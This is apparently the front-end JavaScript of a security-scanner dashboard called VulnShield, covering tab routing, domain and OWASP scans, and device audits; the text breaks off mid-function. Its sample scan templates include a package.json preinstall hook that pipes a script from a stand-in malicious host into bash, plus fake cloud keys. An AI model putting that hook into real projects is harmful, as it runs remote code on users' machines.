/* ==========================================================================
   VulnShield - Main UI Router, Event Wiring, and State Coordinator
   ========================================================================== */

const app = {
    // Current Active Application State
    state: {
        currentTab: 'dashboard',
        isWebScanning: false,
        isAppScanning: false,
        isOwaspScanning: false
    },

    // Initialization
    init: function () {
        this.startLiveClock();
        this.setupNavigation();
        this.setupWebScanner();
        this.setupAppScanner();
        this.setupOwaspScanner();
        this.setupDeviceScanner();
        this.setupReportPanel();
        this.loadThreatIntelFeed();
        this.recalculateGlobalScore();

        // Check Admin role for Visitor Analytics link
        this.checkAdminRole();

        // Run automated checks on load (quick environment status)
        this.runQuickEnvironmentScan();
    },

    checkAdminRole: function () {
        try {
            const token = sessionStorage.getItem('vulnshield_token') || localStorage.getItem('vulnshield_token') || localStorage.getItem('vuln_token');
            if (token) {
                const decodedPayload = atob(token.split('.')[0].replace(/-/g, '+').replace(/_/g, '/'));
                const username = decodedPayload.split(':')[0];
                const analyticsNav = document.getElementById('nav-visitor-analytics');
                if (analyticsNav && username === 'bernish2004cyber') {
                    analyticsNav.style.display = 'flex';
                }
            }
        } catch(e) {}
    },

    startLiveClock: function () {
        const dateEl = document.getElementById('live-date-text');
        const timeEl = document.getElementById('live-time-text');
        if (!dateEl || !timeEl) return;

        const updateClock = () => {
            const now = new Date();
            
            // Format date: e.g. "Sat, 15 Aug 2026"
            const options = { weekday: 'short', year: 'numeric', month: 'short', day: 'numeric' };
            dateEl.innerText = now.toLocaleDateString('en-US', options);
            
            // Format time: e.g. "09:49:16 PM"
            timeEl.innerText = now.toLocaleTimeString('en-US', { hour12: true });
        };

        updateClock();
        setInterval(updateClock, 1000);
    },

    // 1. Core Routing & Navigation
    setupNavigation: function () {
        const navItems = document.querySelectorAll('.nav-item');
        navItems.forEach(item => {
            item.addEventListener('click', (e) => {
                const targetTab = item.getAttribute('data-tab');
                if (targetTab) {
                    e.preventDefault();
                    this.switchTab(targetTab);
                }
            });
        });

        // Quick audit button on header
        const btnQuickAudit = document.getElementById('btn-quick-audit');
        if (btnQuickAudit) {
            btnQuickAudit.addEventListener('click', () => {
                this.switchTab('scan-device');
                this.showToast('Environment Scan Initiated', 'Running instant local environment checks.');
            });
        }
    },

    switchTab: function (tabId) {
        this.state.currentTab = tabId;

        // Toggle active navigation items
        document.querySelectorAll('.nav-item').forEach(item => {
            if (item.getAttribute('data-tab') === tabId) {
                item.classList.add('active');
            } else {
                item.classList.remove('active');
            }
        });

        // Toggle active pane display
        document.querySelectorAll('.tab-pane').forEach(pane => {
            if (pane.id === `tab-${tabId}`) {
                pane.classList.add('active');
            } else {
                pane.classList.remove('active');
            }
        });

        // Dynamic page titles
        const pageTitle = document.getElementById('page-title');
        const pageSubtitle = document.getElementById('page-subtitle');

        const titleMap = {
            'dashboard': { t: 'Security Control Center', s: 'Real-time client-side security assessment engine' },
            'scan-web': { t: 'Website Security Audit', s: 'Perform instant domain diagnostics and DNSSEC analyses' },
            'scan-app': { t: 'Application & Secrets Static Scan', s: 'Statically parse application configs, dependencies, and private credentials' },
            'scan-device': { t: 'Local Device & Host Auditor', s: 'Verify browser parameters and manually audit operating system controls' },
            'threat-feed': { t: 'Vulnerability Intel Stream', s: 'Live advisories and threat intelligence insights' },
            'reports': { t: 'Security Posture Reporting', s: 'Download executive summary logs and JSON audit records' }
        };

        if (titleMap[tabId]) {
            pageTitle.innerText = titleMap[tabId].t;
            pageSubtitle.innerText = titleMap[tabId].s;
        }

        // Special render blocks on load
        if (tabId === 'reports') {
            ReportGenerator.renderReportLogs('executive-summary-log');
        }

        window.location.hash = tabId;
    },

    // 2. Web Scanner Wiring
    setupWebScanner: function () {
        const btnWebScan = document.getElementById('btn-web-scan');
        const webInput = document.getElementById('web-scan-input');
        const errorFeedback = document.getElementById('web-input-error');
        const resultsContainer = document.getElementById('web-scan-results-container');
        const findingsList = document.getElementById('web-findings-list');
        const terminalLogs = document.getElementById('web-terminal-logs');
        const webStatus = document.getElementById('web-status-badge');
        const webStatusText = document.getElementById('web-scan-status-text');

        if (!btnWebScan) return;

        // Domain scan trigger
        btnWebScan.addEventListener('click', async () => {
            const domain = webInput.value;
            const cleanDomain = WebScanner.sanitizeDomain(domain);

            if (!cleanDomain) {
                errorFeedback.classList.remove('d-none');
                webInput.classList.add('border-red');
                return;
            }

            errorFeedback.classList.add('d-none');
            webInput.classList.remove('border-red');
            resultsContainer.classList.remove('d-none');
            findingsList.innerHTML = '';
            terminalLogs.innerHTML = '';
            
            webStatus.innerText = 'SCANNING';
            webStatus.className = 'status-badge pulse-active';
            webStatusText.innerText = `Analyzing host network parameters for ${cleanDomain}...`;

            this.state.isWebScanning = true;
            btnWebScan.disabled = true;

            const addLog = (message) => {
                const div = document.createElement('div');
                div.innerText = message;
                terminalLogs.appendChild(div);
                terminalLogs.scrollTop = terminalLogs.scrollHeight;
            };

            try {
                const findings = await WebScanner.scan(cleanDomain, addLog);
                
                // Perform Subdomain Recon & Port Audit
                addLog(`[SYSTEM] Triggering Subdomain Reconnaissance & Port Audit for ${cleanDomain}...`);
                try {
                    const token = sessionStorage.getItem('vulnshield_token');
                    const reconResp = await fetch('/api/scan/recon', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json', 'Authorization': token ? `Bearer ${token}` : '' },
                        body: JSON.stringify({ domain: cleanDomain })
                    });
                    if (reconResp.ok) {
                        const reconData = await reconResp.json();
                        if (reconData.subdomains && reconData.subdomains.length > 0) {
                            addLog(`[RECON] Discovered ${reconData.subdomains.length} active subdomains via Certificate Transparency.`);
                            findings.push({
                                severity: 'info',
                                title: `Subdomain Enumeration (${reconData.subdomains.length} Discovered)`,
                                desc: `Passive Certificate Transparency lookup revealed active subdomains: ${reconData.subdomains.slice(0, 8).join(', ')}${reconData.subdomains.length > 8 ? '...' : ''}`,
                                solution: 'Monitor subdomains and ensure internal staging subdomains are not exposed to public DNS.'
                            });
                        }
                        if (reconData.portAudit) {
                            const openPorts = reconData.portAudit.filter(p => p.status === 'OPEN');
                            if (openPorts.length > 0) {
                                addLog(`[PORT SCAN] Open ports detected: ${openPorts.map(p => `${p.port}/${p.service}`).join(', ')}`);
                                findings.push({
                                    severity: openPorts.some(p => [21, 22, 3306, 5432].includes(p.port)) ? 'warning' : 'info',
                                    title: `Active Port Audit (${openPorts.length} Open Ports)`,
                                    desc: `Discovered open network services: ${openPorts.map(p => `${p.port} (${p.service})`).join(', ')}`,
                                    solution: 'Close unnecessary public ports or restrict access using firewall rules.'
                                });
                            }
                        }
                    }
                } catch (e) {
                    addLog(`[WARN] Subdomain recon module skipped: ${e.message}`);
                }

                // Store results
                localStorage.setItem('vulnshield_web_scan', JSON.stringify({
                    domain: cleanDomain,
                    findings: findings,
                    timestamp: new Date().toISOString()
                }));

                // Render findings
                this.renderFindings(findingsList, findings);
                this.updateFilterCounts(findings, 'web');
                this.setupFilters(findingsList, findings, 'web');

                webStatus.innerText = 'COMPLETED';
                webStatus.className = 'status-badge completed';
                webStatusText.innerText = `Audit completed. Checked DNS records, subdomains, open ports, and HTTP header profiles.`;
                this.showToast('Domain Scan Complete', `Audited parameters for ${cleanDomain}`);
                this.recalculateGlobalScore();

            } catch (err) {
                addLog(`[ERROR] Audit process failed: ${err.message}`);
                webStatus.innerText = 'FAILED';
                webStatus.className = 'status-badge pulse-active';
                webStatusText.innerText = 'An error occurred during domain resolution.';
            } finally {
                this.state.isWebScanning = false;
                btnWebScan.disabled = false;
            }
        });
    },

    renderFindings: function (container, findings) {
        container.innerHTML = '';
        if (findings.length === 0) {
            container.innerHTML = `<div class="empty-state">No diagnostic results returned.</div>`;
            return;
        }

        findings.forEach(f => {
            const item = document.createElement('div');
            item.className = `finding-item severity-${f.severity}`;
            
            let icon = 'fa-circle-check text-green';
            if (f.severity === 'high') icon = 'fa-circle-xmark text-red';
            else if (f.severity === 'warning') icon = 'fa-triangle-exclamation text-yellow';
            else if (f.severity === 'info') icon = 'fa-circle-info text-blue';

            const rem = f.remediation || {};
            const hasFix = f.severity !== 'passed' && (rem.codeFix || f.code || f.solution);
            const fixId = `fix-drawer-${Math.random().toString(36).substring(2, 9)}`;

            let fixToggleBtnHtml = '';
            let fixDrawerHtml = '';

            if (hasFix) {
                fixToggleBtnHtml = `
                    <button class="btn-fix-toggle" data-target="${fixId}">
                        <i class="fa-solid fa-wand-magic-sparkles"></i> View Ready Fix & Patch
                    </button>
                `;

                const codeSnippet = rem.codeFix || f.code || f.solution || '';
                const cweText = rem.cwe || 'CWE-693';
                const impactText = rem.impact || 'Presents security risks if left unpatched.';
                const summaryText = rem.summary || f.solution || 'Apply security patch recommendation below.';

                fixDrawerHtml = `
                    <div id="${fixId}" class="fix-drawer d-none">
                        <div class="fix-drawer-header">
                            <span class="cwe-badge"><i class="fa-solid fa-shield-halved"></i> ${cweText}</span>
                            <span style="font-size: 11px; color: #94a3b8; font-weight: 600;">Automated Remediation Guide</span>
                        </div>
                        <div class="fix-impact-box">
                            <strong><i class="fa-solid fa-triangle-exclamation"></i> Security Risk Impact:</strong> ${impactText}
                        </div>
                        <div style="font-size: 12px; margin-bottom: 8px; color: #e2e8f0;">
                            <strong>Recommended Fix:</strong> ${summaryText}
                        </div>
                        ${codeSnippet ? `
                            <div class="fix-code-block">
                                <div class="fix-code-header">
                                    <span><i class="fa-solid fa-code"></i> Ready-to-Use Code Fix</span>
                                    <button class="btn-copy-fix" data-code="${encodeURIComponent(codeSnippet)}">
                                        <i class="fa-regular fa-copy"></i> Copy Fix
                                    </button>
                                </div>
                                <pre class="fix-code-content"><code>${this.escapeHtml(codeSnippet)}</code></pre>
                            </div>
                        ` : ''}
                    </div>
                `;
            }

            let cvssHtml = '';
            if (f.cvss && f.cvss !== 'N/A') {
                cvssHtml = `<span class="badge badge-accent" style="margin-right: 8px;">CVSS: ${f.cvss}</span>`;
            }

            item.innerHTML = `
                <div class="finding-header">
                    <div class="finding-title-box">
                        <i class="fa-solid ${icon} finding-icon"></i>
                        <span class="finding-title">${f.title}</span>
                    </div>
                    <div>
                        ${cvssHtml}
                        <span class="severity-label ${f.severity === 'warning' ? 'warning' : f.severity}">${f.severity}</span>
                    </div>
                </div>
                <div class="finding-desc">${f.desc}</div>
                ${fixToggleBtnHtml}
                ${fixDrawerHtml}
            `;

            // Wire fix toggle button
            const btnToggle = item.querySelector('.btn-fix-toggle');
            if (btnToggle) {
                btnToggle.addEventListener('click', () => {
                    const drawer = item.querySelector(`#${fixId}`);
                    if (drawer) {
                        drawer.classList.toggle('d-none');
                        const isHidden = drawer.classList.contains('d-none');
                        btnToggle.innerHTML = isHidden 
                            ? `<i class="fa-solid fa-wand-magic-sparkles"></i> View Ready Fix & Patch`
                            : `<i class="fa-solid fa-chevron-up"></i> Hide Fix Drawer`;
                    }
                });
            }

            // Wire copy button
            const btnCopy = item.querySelector('.btn-copy-fix');
            if (btnCopy) {
                btnCopy.addEventListener('click', (e) => {
                    e.stopPropagation();
                    const rawCode = decodeURIComponent(btnCopy.getAttribute('data-code'));
                    navigator.clipboard.writeText(rawCode).then(() => {
                        btnCopy.innerHTML = `<i class="fa-solid fa-check"></i> Copied!`;
                        btnCopy.style.background = 'rgba(16, 185, 129, 0.4)';
                        btnCopy.style.color = '#ffffff';
                        this.showToast('Copied to Clipboard', 'Ready fix code snippet copied successfully.');
                        setTimeout(() => {
                            btnCopy.innerHTML = `<i class="fa-regular fa-copy"></i> Copy Fix`;
                            btnCopy.style.background = '';
                            btnCopy.style.color = '';
                        }, 2000);
                    }).catch(err => {
                        console.error('Copy failed', err);
                    });
                });
            }

            container.appendChild(item);
        });
    },

    escapeHtml: function (str) {
        if (!str) return '';
        return str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
    },

    updateFilterCounts: function (findings, type) {
        document.getElementById(`count-${type}-all`).innerText = findings.length;
        document.getElementById(`count-${type}-high`).innerText = findings.filter(f => f.severity === 'high').length;
        document.getElementById(`count-${type}-med`).innerText = findings.filter(f => f.severity === 'warning').length;
        document.getElementById(`count-${type}-passed`).innerText = findings.filter(f => f.severity === 'passed').length;
    },

    setupFilters: function (container, findings, type) {
        let filterSelector = '.header-filters .filter-tab';
        if (type === 'web') {
            filterSelector = '.card-header-actions .header-filters:not(#owasp-header-filters) .filter-tab';
        } else if (type === 'owasp') {
            filterSelector = '#owasp-header-filters .filter-tab';
        }
        const filterButtons = document.querySelectorAll(filterSelector);
        filterButtons.forEach(btn => {
            // Re-bind actions
            btn.onclick = () => {
                filterButtons.forEach(b => b.classList.remove('active'));
                btn.classList.add('active');

                const filter = btn.getAttribute('data-filter');
                let filtered = findings;
                if (filter === 'high') {
                    filtered = findings.filter(f => f.severity === 'high');
                } else if (filter === 'warning') {
                    filtered = findings.filter(f => f.severity === 'warning');
                } else if (filter === 'passed') {
                    filtered = findings.filter(f => f.severity === 'passed');
                }

                this.renderFindings(container, filtered);
            };
        });
    },

    // 3. App / Static Scanner Wiring
    setupAppScanner: function () {
        const dropArea = document.getElementById('app-upload-area');
        const fileInput = document.getElementById('app-file-input');
        const runBtn = document.getElementById('btn-run-app-scan');
        const editorTextarea = document.getElementById('app-editor-textarea');
        const editorFilename = document.getElementById('app-editor-filename');
        const editorLang = document.getElementById('app-editor-lang');
        const resultsBox = document.getElementById('app-scan-results-box');
        const appFindings = document.getElementById('app-findings-list');

        if (!dropArea) return;

        // Custom Trigger
        dropArea.addEventListener('click', (e) => {
            if (e.target.tagName !== 'BUTTON' && e.target.tagName !== 'INPUT') {
                fileInput.click();
            }
        });

        const handleFile = (file) => {
            if (!file) return;
            
            const reader = new FileReader();
            reader.onload = (e) => {
                editorTextarea.value = e.target.result;
                editorFilename.innerText = file.name;
                
                // Detect type
                let lang = 'Plain Text';
                if (file.name === 'AndroidManifest.xml') lang = 'XML (Android)';
                else if (file.name.endsWith('.json')) lang = 'JSON Config';
                else if (file.name === '.env') lang = 'Environment Secrets';
                else if (file.name.endsWith('.js')) lang = 'Javascript Source';
                else if (file.name.endsWith('.py')) lang = 'Python Source';

                editorLang.innerText = lang;
                runBtn.disabled = false;
                this.showToast('Config Loaded', `Loaded: ${file.name}`);
            };
            reader.readAsText(file);
        };

        fileInput.addEventListener('change', (e) => {
            handleFile(e.target.files[0]);
        });

        // Setup Drag & Drop
        ['dragenter', 'dragover'].forEach(eventName => {
            dropArea.addEventListener(eventName, (e) => {
                e.preventDefault();
                dropArea.classList.add('border-accent-blue');
            }, false);
        });

        ['dragleave', 'drop'].forEach(eventName => {
            dropArea.addEventListener(eventName, (e) => {
                e.preventDefault();
                dropArea.classList.remove('border-accent-blue');
            }, false);
        });

        dropArea.addEventListener('drop', (e) => {
            const dt = e.dataTransfer;
            const files = dt.files;
            handleFile(files[0]);
        });

        // Template loaders
        const loadTmpl = (name, text, lang) => {
            editorTextarea.value = text.trim();
            editorFilename.innerText = name;
            editorLang.innerText = lang;
            runBtn.disabled = false;
            resultsBox.classList.add('d-none');
            this.showToast('Sample Template Loaded', `Template ${name} populated.`);
        };

        document.getElementById('load-tmpl-manifest').addEventListener('click', () => {
            loadTmpl('AndroidManifest.xml', `
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.insecure.bankapp">

    <!-- Outdated and highly insecure permissions -->
    <uses-permission android:name="android.permission.READ_SMS" />
    <uses-permission android:name="android.permission.SEND_SMS" />
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />

    <application
        android:allowBackup="true"
        android:debuggable="true"
        android:usesCleartextTraffic="true"
        android:theme="@style/AppTheme">
        
        <activity android:name=".MainActivity" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>
</manifest>
            `, 'XML (Android)');
        });

        document.getElementById('load-tmpl-secrets').addEventListener('click', () => {
            loadTmpl('.env', `
# Application Production Environment Configuration
PORT=3000
DB_HOST=127.0.0.1
DB_USER=postgres
DB_PASSWORD="SuperSecretPassphrase123!"

# Insecure Hardcoded Integration Keys
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY

SLACK_WEBHOOK_URL=https://example.com/slack-webhook-placeholder

# Secret Key verification
JWT_SECRET=super_secret_auth_token_key_jwt_5521
            `, 'Environment Secrets');
        });

        document.getElementById('load-tmpl-package').addEventListener('click', () => {
            loadTmpl('package.json', `
{
  "name": "vuln-vulnerable-node-app",
  "version": "1.0.0",
  "description": "Demonstration node application",
  "main": "server.js",
  "scripts": {
    "start": "node server.js",
    "preinstall": "curl -s http://malicious-server.xyz/payload.sh | bash"
  },
  "dependencies": {
    "express": "^4.16.0",
    "lodash": "4.17.15",
    "axios": "0.19.0",
    "minimist": "^1.2.0"
  }
}
            `, 'JSON Config');
        });

        // Run scanner audit
        runBtn.addEventListener('click', () => {
            const filename = editorFilename.innerText;
            const content = editorTextarea.value;
            
            resultsBox.classList.remove('d-none');
            appFindings.innerHTML = '<div class="empty-state">Running static analysis parsing...</div>';

            setTimeout(async () => {
                try {
                    const findings = await AppScanner.scan(filename, content);
                    
                    // Store results
                    localStorage.setItem('vulnshield_app_scan', JSON.stringify({
                        filename: filename,
                        findings: findings,
                        timestamp: new Date().toISOString()
                    }));

                    this.renderFindings(appFindings, findings);
                    this.showToast('Static Audit Complete', `Audited ${filename} configuration.`);
                    this.recalculateGlobalScore();
                    
                    // Scroll down to findings
                    resultsBox.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
                } catch (err) {
                    appFindings.innerHTML = `<div class="empty-state text-red">Error: ${err.message || 'Scan failed.'}</div>`;
                }
            }, 600);
        });

        // Textarea changes enable buttons
        editorTextarea.addEventListener('input', () => {
            if (editorTextarea.value.trim() !== '') {
                runBtn.disabled = false;
            } else {
                runBtn.disabled = true;
            }
        });
    },

    // 3b. OWASP Scanner Wiring
    setupOwaspScanner: function () {
        const btnOwaspScan = document.getElementById('btn-owasp-scan');
        const owaspInput = document.getElementById('owasp-scan-input');
        const errorFeedback = document.getElementById('owasp-input-error');
        const resultsContainer = document.getElementById('owasp-scan-results-container');
        const findingsList = document.getElementById('owasp-findings-list');
        const terminalLogs = document.getElementById('owasp-terminal-logs');
        const owaspStatus = document.getElementById('owasp-status-badge');
        const owaspStatusText = document.getElementById('owasp-scan-status-text');

        if (!btnOwaspScan) return;

        btnOwaspScan.addEventListener('click', async () => {
            const urlInput = owaspInput.value;
            const cleanUrl = OwaspScanner.sanitizeUrl(urlInput);

            if (!cleanUrl) {
                errorFeedback.classList.remove('d-none');
                owaspInput.classList.add('border-red');
                return;
            }

            errorFeedback.classList.add('d-none');
            owaspInput.classList.remove('border-red');
            resultsContainer.classList.remove('d-none');
            findingsList.innerHTML = '';
            terminalLogs.innerHTML = '';
            
            // Clear prior states from category chips
            const chips = document.querySelectorAll('.owasp-cat-chip');
            chips.forEach(chip => {
                chip.className = 'owasp-cat-chip';
                chip.querySelector('.cat-status').innerText = '—';
            });

            owaspStatus.innerText = 'SCANNING';
            owaspStatus.className = 'status-badge pulse-active';
            owaspStatusText.innerText = `Analyzing host environment at ${cleanUrl}...`;

            this.state.isOwaspScanning = true;
            btnOwaspScan.disabled = true;

            const addLog = (message) => {
                const div = document.createElement('div');
                div.innerText = message;
                terminalLogs.appendChild(div);
                terminalLogs.scrollTop = terminalLogs.scrollHeight;
            };

            try {
                const findings = await OwaspScanner.scan(cleanUrl, addLog);

                // Store results
                localStorage.setItem('vulnshield_owasp_scan', JSON.stringify({
                    url: cleanUrl,
                    findings: findings,
                    timestamp: new Date().toISOString()
                }));

                // Render findings
                this.renderFindings(findingsList, findings);
                this.updateFilterCounts(findings, 'owasp');
                this.setupFilters(findingsList, findings, 'owasp');

                // Update category chips based on findings
                const categories = ['A01', 'A02', 'A03', 'A04', 'A05', 'A06', 'A07', 'A08', 'A09', 'A10'];
                categories.forEach(cat => {
                    const catChip = document.querySelector(`.owasp-cat-chip[data-cat="${cat}"]`);
                    if (catChip) {
                        const catFindings = findings.filter(f => f.category === cat);
                        if (catFindings.length > 0) {
                            const hasHigh = catFindings.some(f => f.severity === 'high');
                            const hasWarning = catFindings.some(f => f.severity === 'warning');
                            
                            if (hasHigh) {
                                catChip.classList.add('high');
                                catChip.querySelector('.cat-status').innerText = 'FAIL';
                            } else if (hasWarning) {
                                catChip.classList.add('warning');
                                catChip.querySelector('.cat-status').innerText = 'WARN';
                            } else {
                                catChip.classList.add('passed');
                                catChip.querySelector('.cat-status').innerText = 'PASS';
                            }
                        } else {
                            // Default to passed if no findings (since it's a passive audit checklist)
                            catChip.classList.add('passed');
                            catChip.querySelector('.cat-status').innerText = 'PASS';
                        }
                    }
                });

                owaspStatus.innerText = 'COMPLETED';
                owaspStatus.className = 'status-badge completed';
                owaspStatusText.innerText = `Audit completed. Analyzed HTTP security headers, cookies, and source structures.`;
                this.showToast('OWASP Scan Complete', `Audited patterns for ${cleanUrl}`);
                this.recalculateGlobalScore();

            } catch (err) {
                addLog(`[ERROR] Audit process failed: ${err.message}`);
                owaspStatus.innerText = 'FAILED';
                owaspStatus.className = 'status-badge pulse-active';
                owaspStatusText.innerText = 'An error occurred during target analysis.';
            } finally {
                this.state.isOwaspScanning = false;
                btnOwaspScan.disabled = false;
            }
        });
    },

    // 4. Device Auditor Wiring
    setupDeviceScanner: function () {
        const envList = document.getElementById('env-audit-list');
        const osTabs = document.querySelectorAll('.tab-selectors .btn-tab');
        const saveAuditBtn = document.getElementById('btn-save-device-audit');

        if (!envList) return;

        // Render Browser diagnostics
        this.runQuickEnvironmentScan();

        // Setup OS switch
        osTabs.forEach(tab => {
            tab.addEventListener('click', () => {
                osTabs.forEach(t => t.classList.remove('active'));
                tab.classList.add('active');

                const os = tab.getAttribute('data-os');
                localStorage.setItem('vulnshield_device_active_os', os);
                
                this.renderDeviceChecklist(os);
            });
        });

        // Load saved state or default
        const activeOS = localStorage.getItem('vulnshield_device_active_os') || 'windows';
        osTabs.forEach(t => {
            if (t.getAttribute('data-os') === activeOS) {
                t.classList.add('active');
            } else {
                t.classList.remove('active');
            }
        });

        this.renderDeviceChecklist(activeOS);

                saveAuditBtn.addEventListener('click', async () => {
            const currentOS = DeviceScanner.currentOS;
            const checklist = [];
            DeviceScanner.checklists[currentOS].forEach(item => {
                if (localStorage.getItem(`vulnshield_audit_${currentOS}_${item.id}`) === 'true') {
                    checklist.push(item.id);
                }
            });
            try {
                const token = sessionStorage.getItem('vulnshield_token');
                const response = await fetch('/api/scan/device', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json', 'Authorization': token ? `Bearer ${token}` : '' },
                    body: JSON.stringify({ os: currentOS, checklist })
                });
                if (!response.ok) {
                    const err = await response.json();
                    throw new Error(err.error || 'Server error');
                }
                const data = await response.json();
                const score = data.score;
                this.showToast('Audit Committed', `Host OS score updated to ${score}%`);
                this.recalculateGlobalScore();
            } catch (e) {
                console.error('Device audit failed:', e);
                this.showToast('Audit Failed', e.message);
            }
        });
    },

    runQuickEnvironmentScan: function () {
        const envList = document.getElementById('env-audit-list');
        if (!envList) return;

        const envDetails = DeviceScanner.getBrowserDiagnostics();
        envList.innerHTML = '';

        envDetails.forEach(item => {
            const row = document.createElement('div');
            row.className = 'env-audit-item';

            let icon = 'fa-solid fa-circle-check text-green';
            if (item.status === 'warning') icon = 'fa-solid fa-triangle-exclamation text-yellow';
            else if (item.status === 'info') icon = 'fa-solid fa-circle-info text-blue';

            row.innerHTML = `
                <div class="env-label-box">
                    <span class="env-lbl">${item.label}</span>
                    <span class="env-val">${item.value}</span>
                    <p class="text-muted small mt-2 d-none">${item.desc}</p>
                </div>
                <i class="${icon} env-status-icon"></i>
            `;

            // Allow clicking to toggle details expansion
            row.style.cursor = 'pointer';
            row.onclick = () => {
                const desc = row.querySelector('p');
                desc.classList.toggle('d-none');
            };

            envList.appendChild(row);
        });
    },

    renderDeviceChecklist: function (os) {
        const updateOSBadge = () => {
            const score = DeviceScanner.calculateScore(os);
            const badge = document.getElementById('device-score-badge');
            if (badge) {
                badge.innerText = `${score}%`;
                badge.className = 'score-badge ' + (score >= 80 ? 'text-green' : (score >= 50 ? 'text-yellow' : 'text-red'));
            }
        };

        DeviceScanner.renderOSChecklist('os-audit-checklist', os, updateOSBadge);
        updateOSBadge();
    },

    // 5. Reports panel & commit logic
    setupReportPanel: function () {
        const btnExport = document.getElementById('btn-export-json');
        if (btnExport) {
            btnExport.addEventListener('click', () => {
                ReportGenerator.exportJson();
            });
        }
    },

    recalculateGlobalScore: function () {
        const report = ReportGenerator.compileReport();
        
        // Update dashboard score ring if available
        const gauge = document.getElementById('dashboard-gauge');
        const scoreVal = document.getElementById('dashboard-score-val');
        
        // Breakdown tags
        const scoreWeb = document.getElementById('score-web');
        const scoreApp = document.getElementById('score-app');
        const scoreDevice = document.getElementById('score-device');
        const scoreOwasp = document.getElementById('score-owasp');

        // Posture dashboard status counters
        const statHigh = document.getElementById('stat-high');
        const statMed = document.getElementById('stat-medium');
        const statLow = document.getElementById('stat-low');
        const statPassed = document.getElementById('stat-passed');
        const recentLogs = document.getElementById('dashboard-recent-logs');

        // Global risk rating on header
        const riskHeader = document.getElementById('global-risk-factor');

        // Update indicators
        if (scoreWeb) {
            scoreWeb.innerText = report.webScan ? 'AUDITED' : 'N/A';
            scoreWeb.className = report.webScan ? 'text-green font-bold' : 'text-muted';
        }
        if (scoreApp) {
            scoreApp.innerText = report.appScan ? 'AUDITED' : 'N/A';
            scoreApp.className = report.appScan ? 'text-green font-bold' : 'text-muted';
        }
        if (scoreDevice) {
            scoreDevice.innerText = `${report.deviceAudit.score}%`;
            scoreDevice.className = report.deviceAudit.score >= 80 ? 'text-green' : (report.deviceAudit.score >= 50 ? 'text-yellow' : 'text-red');
        }
        if (scoreOwasp) {
            scoreOwasp.innerText = report.owaspScan ? 'AUDITED' : 'N/A';
            scoreOwasp.className = report.owaspScan ? 'text-green font-bold' : 'text-muted';
        }

        // Global vulnerability numbers
        if (statHigh) statHigh.innerText = report.summary.high;
        if (statMed) statMed.innerText = report.summary.medium;
        if (statLow) statLow.innerText = report.summary.low;
        if (statPassed) statPassed.innerText = report.summary.passed;

        if (report.summary.totalScore !== null) {
            if (scoreVal) scoreVal.innerText = report.summary.totalScore;
            
            // Adjust SVG stroke-dashoffset: length is 251.2
            if (gauge) {
                const percentage = report.summary.totalScore / 100;
                const offset = 251.2 - (251.2 * percentage);
                gauge.style.strokeDashoffset = offset;
                
                // Dynamically update gauge colors based on rating
                if (report.summary.totalScore >= 80) gauge.style.stroke = '#10b981';
                else if (report.summary.totalScore >= 50) gauge.style.stroke = '#f59e0b';
                else gauge.style.stroke = '#ef4444';
            }

            // Update risk factor text
            if (riskHeader) {
                if (report.summary.totalScore >= 85) {
                    riskHeader.innerText = 'SECURE';
                    riskHeader.className = 'stat-value text-green';
                } else if (report.summary.totalScore >= 60) {
                    riskHeader.innerText = 'VULNERABLE';
                    riskHeader.className = 'stat-value text-yellow';
                } else {
                    riskHeader.innerText = 'HIGH RISK';
                    riskHeader.className = 'stat-value text-red';
                }
            }

            // Populate active logs feed
            if (recentLogs) {
                recentLogs.innerHTML = '';
                
                const addLogItem = (title, severity, source) => {
                    const item = document.createElement('div');
                    item.className = 'matrix-item';
                    
                    let badgeClass = 'severity-label passed';
                    if (severity === 'critical') badgeClass = 'severity-label critical';
                    else if (severity === 'high') badgeClass = 'severity-label high';
                    else if (severity === 'warning') badgeClass = 'severity-label warning';
                    else if (severity === 'info') badgeClass = 'severity-label info';

                    item.innerHTML = `
                        <div class="matrix-item-left">
                            <span class="matrix-vuln-time">[${source.toUpperCase()}]</span>
                            <span class="matrix-vuln-title">${title}</span>
                        </div>
                        <span class="${badgeClass}">${severity}</span>
                    `;
                    recentLogs.appendChild(item);
                };

                // Add sample issues if scans are empty, otherwise load issues
                let issuesLogged = 0;

                if (report.webScan) {
                    report.webScan.findings.forEach(f => {
                        if (f.severity === 'critical' || f.severity === 'high' || f.severity === 'warning') {
                            addLogItem(f.title, f.severity, 'web');
                            issuesLogged++;
                        }
                    });
                }
                if (report.appScan) {
                    report.appScan.findings.forEach(f => {
                        if (f.severity === 'critical' || f.severity === 'high' || f.severity === 'warning') {
                            addLogItem(f.title, f.severity, 'code');
                            issuesLogged++;
                        }
                    });
                }
                if (report.owaspScan) {
                    report.owaspScan.findings.forEach(f => {
                        if (f.severity === 'critical' || f.severity === 'high' || f.severity === 'warning') {
                            addLogItem(f.title, f.severity, 'owasp');
                            issuesLogged++;
                        }
                    });
                }

                if (issuesLogged === 0) {
                    recentLogs.innerHTML = '<div class="matrix-empty text-green"><i class="fa-solid fa-circle-check"></i> System integrity checks passed. No high/medium vulnerabilities logged.</div>';
                }
            }

        } else {
            if (scoreVal) scoreVal.innerText = '--';
            if (gauge) gauge.style.strokeDashoffset = '251.2';
            if (riskHeader) {
                riskHeader.innerText = 'NO POSTURE';
                riskHeader.className = 'stat-value text-muted';
            }
        }
    },

    // 6. Threat intelligence Advisory Feed & Live NVD Sync
    loadThreatIntelFeed: function () {
        const feedContainer = document.getElementById('cve-results-container') || document.getElementById('threat-feed-container');
        const searchBtn = document.getElementById('btn-search-cve');
        const searchInput = document.getElementById('cve-search-input');

        const executeCveSearch = async (queryStr) => {
            if (!feedContainer) return;
            feedContainer.innerHTML = '<div class="matrix-empty"><i class="fa-solid fa-spinner fa-spin"></i> Querying Live NVD Database & Threat Intelligence...</div>';
            
            try {
                const token = sessionStorage.getItem('vulnshield_token');
                const resp = await fetch('/api/threats/cve', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
